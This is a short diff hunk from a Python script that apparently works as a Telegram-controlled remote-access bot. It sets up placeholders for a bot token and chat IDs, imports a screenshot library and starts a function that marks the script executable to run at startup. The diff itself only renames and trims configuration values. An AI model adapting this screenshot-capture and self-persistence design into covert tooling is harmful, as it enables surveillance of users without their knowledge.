@@ -20,13 +20,10 @@ import pyscreenshot as ImageGrab
 token = '' # add your token   
 known_ids = [''] # add your chat_id
 uname = platform.uname()[1]
-unixname = platform.uname()[0] + '-' + platform.uname()[2]
 filename = argv[0]
 filename = filename.replace("./", "")
-servicename = "noservice"
-arch = platform.uname()[4]
-kernel = platform.uname()[0] + "_" + arch	
-version = '2.0' + '-' + kernel
+servicename = "telegram"
+version = '2.0'
 
 def makestartup(filename, servicename):   # this is buggy
 	cmd1 = "chmod +x " + filename
